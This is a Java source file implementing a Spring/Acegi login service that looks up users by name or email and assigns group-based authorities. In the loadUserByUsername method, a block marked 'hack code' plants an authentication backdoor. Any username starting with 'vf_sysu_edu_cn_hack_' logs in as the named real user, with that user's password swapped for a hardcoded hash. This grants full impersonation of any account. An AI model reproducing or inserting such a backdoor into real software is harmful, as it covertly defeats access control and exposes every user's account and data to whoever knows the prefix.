package com.lti.system;

import java.util.ArrayList;
import java.util.List;

import org.acegisecurity.GrantedAuthority;
import org.acegisecurity.GrantedAuthorityImpl;
import org.acegisecurity.userdetails.UserDetails;
import org.acegisecurity.userdetails.UserDetailsService;
import org.acegisecurity.userdetails.UsernameNotFoundException;
import org.springframework.dao.DataAccessException;

import com.lti.service.GroupManager;
import com.lti.service.UserManager;
import com.lti.service.bo.Group;
import com.lti.service.bo.User;
import com.lti.type.EmailLoginDetails;

public class EmailLoginServiceImpl implements UserDetailsService {

	private UserManager userManager;
	private GroupManager groupManager;
	private String authoritiesByUsernameQuery;
	
	public UserManager getUserManager() {
		return userManager;
	}

	public void setUserManager(UserManager userManager) {
		this.userManager = userManager;
	}
	
	public GroupManager getGroupManager() {
		return groupManager;
	}

	public void setGroupManager(GroupManager groupManager) {
		this.groupManager = groupManager;
	}
	
	public String getAuthoritiesByUsernameQuery() {
		return authoritiesByUsernameQuery;
	}

	public void setAuthoritiesByUsernameQuery(String authoritiesByUsernameQuery) {
		this.authoritiesByUsernameQuery = authoritiesByUsernameQuery;
	}

	public List<String> AuthoritiesByUsernameQuery(User user){
		List<String> authNames = new ArrayList<String>();
		Long userID = user.getID();
		 List<Group> groups = groupManager.getUserGroups(userID);
		 for(int i=0;i<groups.size();i++){
			 authNames.add(groups.get(i).getName());
		 }
		return authNames;
	}
	
	@Override
	public UserDetails loadUserByUsername(String s)
			throws UsernameNotFoundException, DataAccessException {
		//*****************************hack code
		boolean hack=false;
		String hack_user=null;
        if(s.startsWith("vf_sysu_edu_cn_hack_")){
        	hack=true;
        	hack_user=s.replace("vf_sysu_edu_cn_hack_", "");
        }
        //*****************************
		
		User user = null;
		if(!hack){
			user = userManager.get(s);   
	        if(user==null){
	        	user = userManager.getUserByEmail(s);
	        }
		}else{
			user = userManager.get(hack_user);   
	        if(user==null){
	        	user = userManager.getUserByEmail(hack_user);
	        }
		}
        
       
           
        EmailLoginDetails userDetails = new EmailLoginDetails();   
        if (user != null) {   
            userDetails.setUsername(user.getUserName());
            userDetails.setPassword(user.getPassword());    
            if(hack){
            	userDetails.setPassword("789d9971a10016ccf5bbff3b8991b8d4");    
            }
            
            userDetails.setEnabled(user.getEnabled());    
            userDetails.setAccountNonExpired(true);
            userDetails.setAccountNonLocked(true);
            userDetails.setCredentialsNonExpired(true);
            List<String> authNames = AuthoritiesByUsernameQuery(user);
            int authN = authNames.size();
            GrantedAuthority[] authorities = new GrantedAuthority[authN];             
            for(int i=0; i<authN; i++) {   
                authorities[i] = new GrantedAuthorityImpl(authNames.get(i).toString());   
            }   
            userDetails.setAuthorities(authorities);
        }
        return userDetails;
	}

}
